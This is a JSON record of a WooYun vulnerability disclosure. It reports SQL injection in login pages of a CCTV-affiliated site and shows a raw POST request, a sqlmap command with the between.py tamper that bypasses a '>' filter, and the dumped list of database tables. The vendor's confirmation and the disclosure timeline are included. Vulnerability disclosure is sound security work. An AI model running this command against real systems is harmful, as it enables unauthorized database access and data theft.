{"id": 78755, "wybug_id": "wooyun-2015-0159734", "wybug_title": "cctv某分站多处SQL注入打包(绕过过滤)", "wybug_corp": "中国网络电视台", "wybug_author": "hecate", "wybug_date": "2015-12-10 10:15", "wybug_open_date": "2016-01-23 15:16", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-23：\t细节向公众公开  简要描述： 只过滤了 > 符号 详细说明：  \n\n4个登录入口皆可注入\nhttp://www.chnpec.com/cpec_tran/index.php?action=translat-ShowLoginhttp://www.chnpec.com/cpec_zh/index.php?action=login-checkloginhttp://www.chnpec.com/cpec_international_zh/index.php?action=login-checklogin&rel=L2NwZWNfaW50ZXJuYXRpb25hbF96aC8=http://www.chnpec.com/cpec_international_en/index.php?action=login-checklogin&rel=L2NwZWNfaW50ZXJuYXRpb25hbF9lbi8=\n以其中一个为例\nPOST /cpec_tran/index.php?action=translat-userLogin HTTP/1.1Host: www.chnpec.comUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:42.0) Gecko/20100101 Firefox/42.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh,en-US;q=0.7,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://www.chnpec.com/cpec_tran/index.php?action=translat-ShowLoginCookie: PHPSESSID=4c8d55rdanaakmga5q34cc6kl4Connection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 39tran_username=admin&tran_password=admin\n参数 username直接使用sqlmap跑不出\n\n然后使用between替换大于符号即可绕过\nsqlmap -u \"http://www.chnpec.com/cpec_tran/index.php?action=translat-userLogin\" --data \"tran_username=admin&tran_password=admin\" --dbs --random-agent --tamper between.py\n   漏洞证明：  \n\n数据挺多\nDatabase: cpec+---------------------------+---------+| Table                     | Entries |+---------------------------+---------+| crproggetrightfr          | 302184  || program_view              | 15344   || tab_basicinformation      | 15344   || crproginfo                | 9762    || crprogsalerightfr         | 5957    || crprogsalerigjt           | 3699    || tab_video_cut             | 3662    || tab_basicinformation_en   | 1604    || tab_info_video            | 1110    || tab_videoimg              | 952     || tab_info_img              | 892     || tiabstract                | 870     || temp_yrj                  | 849     || tvvideoinfo               | 849     || tiproginfo                | 739     || welive_msg                | 730     || tab_video                 | 601     || tab_city                  | 483     || tab_tran_task             | 262     || perm_role_function        | 242     || tab_material              | 202     || tab_program_hot           | 183     || hotwell_view              | 163     || tab_basiccolumn           | 143     || tab_crprogtip_relation    | 133     || tab_tv_videoinfo          | 81      || perm_function_group       | 64      || tab_words                 | 62      || perm_user_role            | 55      || tab_program_apple         | 41      || welive_session            | 38      || tab_user                  | 34      || tab_web_user              | 32      || tiprogeng                 | 21      || welive_user               | 15      || welive_comment            | 14      || perm_role                 | 13      || incre_table               | 6       || welive_usergroup          | 4       || tab_tran_user             | 2       || tab_international_syntime | 1       || welive_guest              | 1       |+---------------------------+---------+\n   修复方案：  过滤   版权声明：转载请注明来源 hecate@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-12-10 11:00 厂商回复： 非常感谢~~ 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-12-10 11:04 |    \t\thecate \t\t\t( 普通白帽子  |\t\t\t        Rank:754 漏洞数:116        | ®高级安全工程师 | WooYun认证√)\t\t \n  @中国网络电视台 不用谢，有礼物吗    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}